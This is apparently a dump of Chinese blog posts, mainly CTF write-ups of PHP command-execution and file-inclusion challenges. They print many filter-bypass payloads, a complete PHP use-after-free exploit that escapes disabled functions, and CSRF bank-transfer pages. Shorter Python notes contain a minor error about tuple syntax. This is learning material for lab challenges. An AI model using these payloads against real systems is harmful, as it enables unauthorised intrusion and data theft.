35\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号,左尖括号,等于号，同上\n\n##### 36\n\n```\npayload:?c=include%09$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号,左尖括号,等于号,数字，将get参数中的数字改为字母即可\n\n##### 37\n\n```\npayload:?c=php://input\n请求体:<?php include \"flag.php\"?>\n或\npayload:?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==\n```\n\ninclude函数开始，过滤了flag，通过php://input伪协议直接包含文件\n\n##### 38\n\n```\npayload:?c=data://text/plain;base64,PD9waHAgaW5jbHVkZSAiZmxhZy5waHAiPz4=\n```\n\n过滤了flag, php,file，通过data伪协议执行include \"flag.php\"\n\n##### 39\n\n```\npayload:?c=data://text/plain,<?php system(\"cat fla*.php\");?>\n```\n\n过滤了flag并且包含的是变量c.php，输入后相当于直接执行输入的PHP命令，由于前面的PHP内容已经闭合，所以后面的.php直接就是.php文本显示，对前面的命令输入没有影响\n\n##### 40\n\n```\npayload:?c=eval(array_pop(next(get_defined_vars())));\n\nPOST:a=system('cat flag.php');\n```\n\nprint_r(get_defined_vars());可以拿到所有已经定义的变量并取得值\n\nnext(变量)可以获得下一个变量\n\narray_pop(数组)弹出数组中的变量为单个独立变量\n\n```\nc=session_start();system(session_id());\npassid=ls\n```\n\n本地修改sessionID传入命令\n\n##### 41\n\n```\n\n```\n\n```\n'/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-/i'\n```\n\n可以发现大多数自负都被过滤，查看提示\n\n通过脚本可获取异或（｜）后能得到的所有字符\n\n直接使用脚本\n\n##### 42\n\n```\npayload:?c=cat flag.php;\n```\n\n$c.\" >/dev/null 2>&1\"\n\n题目中将命令输出保存到黑洞中，可通过分号分割命令让第一个执行的命令直接显示\n\n##### 43\n\n```\npayload:?c=tac%20flag.php%26%26\n```\n\n同上题，过滤了cat和分号，通过&&也可进行多命令执行，要进行URL编码\n\n##### 44\n\n```\npayload:?c=tac%20fla*.php%26%26\n```\n\n同上题，过滤了flag，使用通配符\n\n##### 45\n\n```\npayload:?c=tac${IFS}fla*.php%26%26\n```\n\n同上题，过滤了空格，找个能替代的就行\n\n##### 46\n\n```\npayload:?c=tac%09fla?.php%26%26\n```\n\n同上题，过滤了*和$，使用%09（制表符）替代空格\n\n##### 47\n\n```\npayload:?c=tac%09fla?.php%26%26\n```\n\n同上题，过滤了一些读取文件的命令，但没滤tac，直接用\n\n##### 48\n\n```\npayload:?c=tac<fl%27%27ag.php%26%26\n```\n\n同上题，过滤了数字和空格\n\n##### 49\n\n```\npayload:?c=tac<fl%27%27ag.php||\n```\n\n同上题，过滤了水平制表符和&&符，将&更换为｜也可以多命令执行\n\n##### 50\n\n```\npayload:?c=tac<fl%27%27ag.php||\n```\n\n##### 51\n\n```\npayload:?c=nl<fla%27%27g.php||\n```\n\n滤了tac呜呜呜呜用nl\n\n##### 52\n\n```\npayload:?c=nl${IFS}/fl%27%27ag||\n```\n\n滤掉了尖括号但是$回来了\n\n`nl${IFS}fla%27%27g.php||`\n\n但是明显flag不对，所以看一下根目录`ls${IFS}/`发现flag存在\n\n使用nl读取\n\n##### 53\n\n```\npayload:?c=ta%27%27c${IFS}fla?.php\n```\n\n该题内容不同\n\n```\necho($c);\n$d = system($c);\necho \"<br>\".$d;\n```\n\n先将命令打印并执行后获得system函数的返回值并输出，system函数只返回命令执行后输出的最后一行，使用tac\n\n##### 54\n\n```\npayload:c=mv${IFS}fla?.php${IFS}kkk.txt\n/kkk.txt\n```\n\n过滤了单引号绕过，通过mv命令重命名直接读取\n\n##### 55\n\n过滤`\"/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\>|\\</i\"\n\n**无字母数字的命令执行**\n\n直接讲原理咯\n\n.（点）或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则“.file”的意思就是用bash执行file文件中的命令。用“.file”执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用“.”来执行它了吗？\n\n咋执行呢，原理是当我们发送一个上传文件的POST包时，这个文件会被储存在临时目录中，默认的文件是`/tmp/phpXXXXXX`(六个随机字符)，那么我们就可以用通配符（?单匹配和*多匹配）来尝试执行我们上传的文件，但是尝试执行后发现不行，我们自己搭建一个php环境看一下为什么\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming1.png)\n\n列出相关的文件后发现是因为符合匹配条件的文件数量不止一个，就导致还没运行到我们上传的脚本时就已经结束了，所以我们要尝试用其他的通配符匹配出我们需要的文件，查看相关资料，Linux的glob通配符的相关内容（贴个链接）\n\nhttps://man7.org/linux/man-pages/man7/glob.7.html\n\n除了使用?和*进行任意匹配，还可以使用`[^X]`来排除某个字符，这样我们就可以排除前面包含`-`和`.`文件，继续查看发现还剩下三个文件，而后发现还有一个通配符语法`[X-Y]`可以表示一个范围，而且只有php临时文件中包含大写字母，查询ascii码表发现大写字母位于`@`和`[`之间，所以构造`[@-[]`就可以匹配到我们的文件了\n\n最终payload\n\n首先构建一个上传文件的html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>POST数据包POC</title>\n</head>\n<body>\n<form action=\"当前链接/?c=./???/????????[@-[]\" method=\"post\" enctype=\"multipart/form-data\">\n    <label for=\"file\">文件名：</label>\n    <input type=\"file\" name=\"file\" id=\"file\"><br>\n    <input type=\"submit\" name=\"submit\" value=\"提交\">\n</form>\n</body>\n</html>\n```\n\n第一个文件内容\n\n```shell\nls\n然后\ncat /var/www/html/flag.php\n```\n\n如果一次不成功就repeater多试几次\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming2.png)\n\n拿到flag\n\n##### 57\n\n```\npayload:?c=$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))\n```\n\n[a-z]|[0-9]|\\`|\\|\\#|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\x0a|\\>|\\<|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i\n\n过滤了大量字符，最终需要构建36即可，没有过滤`$`，而在Linux中$是变量的关键字，所以我们可以使用变量\n\n```\n$(())这个变量中的()代表数学运算，结果为0，所以\necho $(())\n0\n对这个变量进行取反操作结果为\necho ~$(())\n~0\n那么我们再对~0进行数学运算得到的结果就是\necho $((~$(())))\n~1\n所以我们想得到36就是让36个~1相加再取反\necho $((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))\n```\n\n##### 58\n\n```\npayload:\nPOST\nc=file_get_contents('flag.php')\n```\n\n命令执行，突破禁用函数\n\n首先尝试system发现被过滤了，emmmm尝试过后发现能执行系统命令的全被禁用了\n\n那么尝试能否读取文件，使用file_get_contents读取成功，提示中也显示show_source同样可用\n\n##### 59\n\n```\npayload:\nPOST\nc=show_source('flag.php')\n```\n\n能执行系统命令的就别试了，全挂了\n\nshow_source可用\n\n还可尝试通过include来包含文件，再通过PHP伪协议进行读取\n\n```\npayload:?file=php://filter/read=convert.base64-encode/resource=flag.php\nPOST\nc=include($_GET['flie']);\n```\n\n##### 60\n\n```\npayload:\nPOST\nc=highlight_file('flag.php');\n```\n\n上一题可用的方法也可\n\n##### 61\n\n同上\n\n##### 62\n\n```\npayload:\nPOST\nc=include('flag.php');echo $flag;\n```\n\n上面所有方法皆可\n\n##### 63\n\n```\npayload:\nPOST\nc=include('flag.php');var_dump(get_defined_vars());\n```\n\n`get_defined_vars()`可获得所有已定义的变量，当不知道变量名时可使用这个\n\n上面方法同样🉑️\n\n##### 64\n\n```\npayload:\nPOST\nc=include('flag.php');echo $flag;\n```\n\n`scandir('.')`可用于扫描文件，和ls一个意思，当我们不知道文件名时可使用\n\n##### 65\n\n同上\n\n##### 66\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-19 17.49.25.png)\n\n尝试失败还被嘲讽了，首先扫描一下文件，发现根目录下有flag.txt，`highlight_file('/flag.txt')`读取即可\n\n```\npayload:\nPOST\nc=highlight_file('/flag.txt');\n```\n\n##### 67\n\n同上\n\n##### 68\n\n```\npayload:\nPOST\nc=include('/flag.txt')\n```\n\n属于是离谱了，直接封了`highlight_file`函数，`var_dump(scandir('/'))`，发现在根目录中，直接include文件，没有php标签即为直接显示源码，等于直接显示flag.txt的内容\n\n##### 69\n\n同上\n\n##### 70\n\n继续白嫖\n\n##### 71\n\n```\npayload:\nPOST\nc=include('/flag.txt');exit();\n```\n\n尝试白嫖发现失败，下载源码进行查看，发现在输出之前将缓冲区中的所有数字字母换成了问号，那么我们让它包含完直接退出就行了\n\n##### 72\n\n文件换位置了哭哭，scandir找不到根目录，var_dump也没了，哭哭\n\n看提示\n\n首先找出文件名\n\n```PHP\npayload:\nPOST\nc=$a=new DirectoryIterator(\"glob:///*\");\nforeach($a as $f)\n{echo($f->__toString().' ');\n} exit(0);\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-19 23.52.16.png)uaf脚本如下\n\n```PHP\n<?php\nfunction ctfshow($cmd) {\n    global $abc, $helper, $backtrace;\n\n    class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this->a);\n            $backtrace = (new Exception)->getTrace();\n            if(!isset($backtrace[1]['args'])) {\n                $backtrace = debug_backtrace();\n            }\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= sprintf(\"%c\",($ptr & 0xff));\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = sprintf(\"%c\",($v & 0xff));\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { \n\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { \n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                \n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                \n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) {\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) {\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    function trigger_uaf($arg) {\n\n        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\n        $vuln = new Vuln();\n        $vuln->a = $arg;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; \n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\n\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); \n    write($abc, 0xd0 + 0x68, $zif_system); \n\n    ($helper->b)($cmd);\n    exit();\n}\n\nctfshow(\"cat /flag0.txt\");ob_end_flush();\n?>\n\n```\n\n最终\n\n```\npayload:\nPOST\nc=上面的代码\n```\n\n##### 73\n\n同上，文件名更改为flagc\n\n##### 74\n\n```\npayload:\nPOST\nc=include('/flagx.txt');exit();\n```\n\n首先扫目录，同上题payload，而后发现在根目录有flagx.txt尝试包含成功\n\n##### 75\n\nban掉了open_basedir访问文件的方式，只能通过别的方法来访问文件，可以通过mysql访问，在前面几题中可以找到mysql的账号密码，最终payload如下\n\n```PHP\npayload:\nPOST\nc=try {\n  $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');\n  foreach($dbh->query('select load_file(\"/flag36.txt\")') as $row)\n\t{\n    echo($row[0]); \n  }\n  $dbh = null;\n}\ncatch (PDOException $e) \n{\n  echo $e->getMessage();\n  exit(0);\n}\nexit(0);\n```\n\n拓展PDO知识：\n\n```PHP\nPHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。\nPDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。\nPDO随PHP5.1发行，在PHP5.0的PECL扩展中也可以使用，无法运行于之前的PHP版本。\n一个实例\n<?php\n$dbms='mysql';     //数据库类型\n$host='localhost'; //数据库主机名\n$dbName='test';    //使用的数据库\n$user='root';      //数据库连接用户名\n$pass='';          //对应的密码\n$dsn=\"$dbms:host=$host;dbname=$dbName\";\n\ntry {\n    $dbh = new PDO($dsn, $user, $pass); //初始化一个PDO对象\n    echo \"连接成功<br/>\";\n    /*你还可以进行一次搜索操作\n    foreach ($dbh->query('SELECT * from FOO') as $row) {\n        print_r($row); //你可以用 echo($GLOBAL); 来看到这些值\n    }\n    */\n    $dbh = null;\n} catch (PDOException $e) {\n    die (\"Error!: \" . $e->getMessage() . \"<br/>\");\n}\n//默认这个不是长连接，如果需要数据库长连接，需要最后加一个参数：array(PDO::ATTR_PERSISTENT => true) 变成这样：\n$db = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT => true));\n\n?>\n```\n\n##### 76\n\n同上改名字\n\n##### 77\n\n首先还是扫目录，文件名flag36x.txt，尝试上题方法发现数据库消失，看提示是PHP7.4以上的新特性，可以通过新建一个FFI对象来执行系统命令，又因为执行系统命令后没有回显，所以我们把执行后的结果放到网站目录下的一个文本文件中进行读取\n\n```php\npayload:\nPOST\nc=$ffi = FFI::cdef(\"int system(const char *command);\");\n$a='/readflag > /var/www/html/1.txt';\n$ffi->system($a);\n```\n\n然后访问/1.txt即可\n\n##### 118\n\n首先查看源码，发现输入被包含到system函数中执行，尝试`echo，whoami，ls，cat`全部失效想方法绕过，输入空格发现可以执行，所以可以尝试通过构造系统变量来执行，查看提示的图片\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-21 16.39.03.png)\n\n发现是默认配置文件下的文件名列表，可以通过剪裁构造变量，读取文件命令最容易进行构造的就是`nl`，想拼接出nl只需要取系统配置变量最后一位n和当前执行目录最后一位l即可，最终payload如下\n\n```\npayload:${PATH:~0}${PWD:~0}$IFS????.???\n```\n\n发现还是不行，是因为过滤了数字，没关系，剪裁字符还可通过大写字母解决，真·最终payload如下\n\n```\npayload:${PATH:~A}${PWD:~A}$IFS????.???\n```\n\n**系统变量补充知识**\n\n```\n$PATH 系统配置变量\n$PWD 当前执行目录\n$HOME 默认进入的目录\n$SHELL\n$USER 当前user\n$SHLVL 代表当前shell窗口的深度，一般为1\n$PHP_CFLAGS 指定头文件（.h文件）的路径，如：CFLAGS=-I/usr/include -I/path/include。同样地，安装一个包时会在安装路径下建立一个include目录，当安装过程中出现问题时，试着把以前安装的包的include目录加入到该变量中来。\n$PHP_VERSION PHP版本\n\n```\n\n**Linux变量补充知识**\n\n```\n${变量名:从哪一位开始取:取多长}，如没有长度默认取到最后，如果没有起始位就从头开始\n${#变量名}，代表这个变量的长度\n$\n```\n\n##### 119\n\n先尝试上一把的是否可行，不行所以直接看提示吧，系统变量的知识补充在上一道题了，针对本题\n\n```\nSHLVL的值为2，#SHLVL的值为1，从PHP_VERSION的第二位取一个为3，也就是${PHP_VERSION:${SHLVL}:${#SHLVL}}为3，最终取\nPHP_CFLAGS变量从第三位开始的前三个即可构造tac\n```\n\n最终payload如下\n\n```\npayload:${PHP_CFLAGS:${PHP_VERSION:${SHLVL}:${#SHLVL}}:${PHP_VERSION:${SHLVL}:${#SHLVL}}} ????.???\n```\n\n##### 120\n\n上一把的字符太长了，只能通过别的命令读取了\n\n```\ntips：Linux中的base64在/bin目录之下，base64 文件名即可将文件进行base64编码\n```\n\n所以我们最终构造出结果为/bin/base64 flag.php即可\n\n首先是/字符，PWD首位，而后bin可使用通配符，尝试base64也使用通配符不可行，所以我们尝试构建出数字4来匹配\n\n```\ntips：RANDOM变量能生成一万以内的随机数，用#取长度即可有概率得到4\n```\n\n最终payload\n\n```\npayload:\nPOST\ncode=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???\n```\n\n~~多刷新几次总会出来的~~\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-21 19.36.51.png)\n\n##### 121\n\n尝试上题payload，发现SHLVL被过滤了，所以我们需要一个1\n\n```\ntips:通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误\n```\n\n所以我们使用${#?}即可构造出1，最终payload如下\n\n```\npayload:\nPOST\ncode=AAAAAAAAA\ncode=${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???\n```\n\n##### 122\n\n滤了PWD但是有HOME，HOME替换PWD就行，滤了#号没发去长度，RANDOM取一位即可，随机到了就是胜利\n\n```\npayload:\nPOST\ncode=A;${PWD::${?}}???${PWD::${?}}?????${RANDOM} ????.???\n```\n\n","tags":["CTF","web"]},{"title":"Python于web层应用","url":"/posts/4256.html","content":"\n# Python于web层应用\n\n## HTTP协议基础\n\n### 协议分类\n\nHTTP 1.0 80端口 单次一个链接\n\nHTTP 1.1 80端口 多次可一个链接\n\nHTTP协议不够安全，进而发展出了HTTPS协议\n\nHTTPS 443端口 加密后数据传输\n\n<!--more-->\n\n### 请求方法\n\n###### HTTP 1.0\n\nGET POST HEAD\n\n###### HTTP 1.1与HTTPS\n\nOPTIONS PUT DELETE TRACE CONNECT PATCH\n\n### URL格式\n\n协议://主机名.域名/文件夹/文件?参数=值&参数=值\n\n### HTTP请求头\n\nUser-Agent：浏览器版本信息\n\nAccept-encoding：浏览器接受的编码\n\nReferer：当前网页跳转来源\n\nCookie：顾名思义，~~好吃的饼干，~~Cookie信息\n\nLocation：跳转到哪里\n\nSet-Cookie：设置Cookie信息\n\nWWW-Authenticate：用于身份验证HTTP Basic等\n\n### HTTP响应状态码\n\n1XX：信息提示\n\n2XX：成功\n\n3XX：重定向\n\n4XX：客户端错误\n\n5XX：服务端错误\n\n### 查看HTTP\n\n使用浏览器审查进行查看\n\n使用Burpsuite截断查看\n\n## Python使用HTTP请求\n\n###### GET请求\n\n不带参数`requests.get(url)`\n\n带参数`requests.get(url=url,params={\"key1\":\"value1\",\"key2\":\"value2\"})`\n\n返回的对象r.url获取url\n\n###### POST请求\n\n不带参数`requests.post(url)`\n\n带参数`requests.post(url=url,data={\"key1\":\"value1\",\"key2\":\"value2\"})`\n\n###### 自定义请求头\n\nheaders={key1:value1,key2:value2}\n\nrequests.get(url=url,headers=headers)\n\n###### 其他请求\n\nrequests.put(url,data)\n\nrequests.delete(url)\n\nrequests.head(url)\n\nrequests.options(url)\n\n## Python处理HTTP响应\n\n**获取相应状态码：**r.status_code\n\n**获取响应文本：**r.content（获取到二进制内容）r.text（获取原始文本代码）\n\n**获取相应头：**r.headers\n\n**获取请求头：**r.reuqests.headers\n\n**获取请求URL：**r.url\n\n**获取Cookie：**r.cookies\n\n## Python设置HTTP代理\n\n**代理设置：**http和https:`proxies={'http':'http://代理服务器:代理端口','https':'https://代理服务器:代理端口'}`\n\n**参数设置：**`proxies=proxies,verfiy=False`\n\n## Python会话编程\n\n通过Set-Cookie设置一个cookie值\n\n使用`s=requesets.Session()`建立一个新的空会话\n\n`r=s.get(url)`来在会话中发起个体请求\n\n## Python制作目录扫描工具\n\n###### 目录扫描原理\n\n1、读取字典文件拼接URL\n\n2、通过get请求访问URL\n\n3、获取状态码判断目录是否存在\n\n###### 字典文件读取\n\n1、`with open(\"filename.txt\",\"r\") as f:`\n\n2、读取方式：\n\n- `f.readline()//读取一行`\n- `f.readlines()//逐行读取到一个列表中`\n- `f.read(字节数)//按字节读`\n- `line.strip()//去除空行`\n\n3、`f.close()`关闭文件流\n\n4、sys库中的sys.argv[0]为当前python文件绝对路径，sys.argv[1]为传入第一个参数\n\n5、User-Agent通过抓包先获取真实的User-Agent，再通过headers字典传入get请求\n\n## IIS PUT漏洞\n\nIIS中拓展工具WebDAV支持HTTP方法，也提供了一些其他功能强大的方法（Move），使得开启WebDAV可以直接上传任意文件\n\n**探测方法：**通过HTTP中options方法可以探测出服务器支持的HTTP方法\n\n**探测过程：**\n\n- 确定目标主机\n- 使用HTTP options方法探测\n- 查看返回结果中是否存在MOVE PUT\n- 查看响应头中的PUBLIC属性\n\n## 探测服务器信息\n\n相应头中的Server：服务器中间件属性\n\nX-Powered-By：服务器脚本技术\n\n## Python制作漏洞检测工具\n\n首先了解漏洞产生原理，根据漏洞原理写出对应的POC代码来验证漏洞是否存在\n\n## 构建站点地图\n\n测试Web App的首要任务就是获取站点完整的目录和文件\n\n###### 技术种类：建议使用两种方式同时进行\n\n1、通过基于字典的目录文件扫描\n\n2、通过基于网络爬虫的技术（可通过requests库构建，但是很复杂，有scrapy库可用于构建爬虫）\n\n3、通过Burpsuite构建网站地图\n","tags":["web"]},{"title":"文件包含","url":"/posts/59563.html","content":"\n# 文件包含\n\n","tags":["CTF","web"]},{"title":"XSS","url":"/posts/7933.html","content":"\n# XSS\n\n#### 内容：\n\n全称为跨站脚本攻击，是一种Web应用程序的漏洞，来自用户的不可信数据在没有验证的情况下被应用程序进行了处理，没有正确转义（escape）或编码（encode）反射回浏览器，导致浏览器引擎执行了非预期代码\n\n#### 类型：\n\n###### 反射性：直接传输代码后，经过后端渲染代码直接放入了前端页面中\n\n###### 存储型：将代码经过后端处理存入数据库，当从数据库查询经前端渲染后代码被执行\n\n###### DOM型：不需要以来服务端相应内容，如果HTML页面中使用了document.location等DOM元素的属性，攻击者就可以利用这些属性注入恶意脚本实施基于DOM的跨站脚本攻击\n\n<!--more-->\n\n#### DOM：\n\nDocument Object Model（文档对象模型），通过HTLM DOM，树中所有节点都可通过JavaScript进行访问，修改，创建，删除\n\n![DOM示意](/images/DOM示意.png)\n\nXSS盲打：\n\n构架script标签使受害者执行，通过document.location和document.cookie获取到受害者的cookie及管理页面等隐私内容导致网站内容泄漏\n\n```html\n<sCRiPt sRC=></sCrIpT>\n```\n\n\n\n#### CSRF：\n\n跨站请求伪造\n\n攻击流程：通过获取受害的Cookie等信息，伪造对应用户的请求头，通过用户身份![CSRF](/images/CSRF.jpg)\n\n使用方法：制作网站时可通过构造img标签直接访问，如\n\n```html\n<img src=\"http://www.myBank.com/Transfer.php?toBankId=1111&money=1000\">\n```\n\n或者通过JavaScript构造post请求并通过dom元素直接提交，如\n\n```html\n<html>\n　　<head>\n　　　　<script type=\"text/javascript\">\n　　　　　　function steal()\n　　　　　　{\n          　　　　 iframe = document.frames[\"steal\"];\n　　     　　      iframe.document.Submit(\"transfer\");\n　　　　　　}\n　　　　</script>\n　　</head>\n\n　　<body onload=\"steal()\">//页面完全载入后触发\n　　　　<iframe name=\"steal\" display=\"none\">\n　　　　　　<form method=\"POST\" name=\"transfer\"　action=\"http://www.myBank.com/Transfer.php\">\n　　　　　　　　<input type=\"hidden\" name=\"toBankId\" value=\"11\">\n　　　　　　　　<input type=\"hidden\" name=\"money\" value=\"1000\">\n　　　　　　</form>\n　　　　</iframe>\n　　</body>\n</html>\n```\n\n或者完全伪造原表单，并且填写好内容，通过javascript直接提交\n\n```html\n<body>\n    <form method=\"post\" action=\"money.php\" id=\"mon\">\n        用户名：<input type=\"text\" name=\"user\" id=\"user\" value=\"Jlan\">\n        转账人：<input type=\"money\" name=\"money\" id=\"pass\" value=\"100000\">\n    </form>\n    <script>\n        document.getElementById(\"mon\").submit()\n    </script>\n</body>\n```\n\n#### SSRF：\n\n服务端请求伪造\n\n攻击流程：通过页面中可访问其他页面的位置通过服务端发起请求进而获取到客户端无法访问的内部系统\n\n攻击位置：有在线翻译，页面收藏，图片加载下载等\n","tags":["CTF","web"]},{"title":"Python面向对象","url":"/posts/18439.html","content":"\n# Python面向对象\n\n#### 类的定义：\n\n```python\n#object是所有类的基类\n#每个对象会保存自己的属性，不同对象间属性没有必然联系\n#类内部可通过self操作\nclass 类名(object):\n  def 函数名(self):\n    方法内容\n\t\n```\n\n<!--more-->\n\n#### 类外操作对象属性：\n\n```python\n对象名.属性名=属性内容#给类添加或修改属性\n```\n\n#### 魔法方法：\n\n这类方法以双下划线开头和结尾，在满足某种特定条件是会调用这种方法\n\n```python\n#创建对象后会立即调用\n#使用时类似构造函数\n__init__(self,参数1,参数2)\n```\n\n```python\n#该方法返回值为字符串，在使用print(对象)时会自动调用\n#进行强制类型转换时也会自动调用\n__str__(self)\n```\n\n```python\n#对象在内存中被销毁时会调用\n#使用时类似析构函数，可使用del 变量名进行销毁\n__del__(self)\n```\n\n","tags":["Note","Python"]},{"title":"Python基础","url":"/posts/14702.html","content":"\n# Python基础\n\n#### 数据类型：\n\nstring（字符串）\n\nnum（数字）\n\nbool（布尔）\n\nlist（列表）使用[    ]定义\n\ntuple（元组）使用{     }定义（无序）\n\ndictionary（字典）使用{     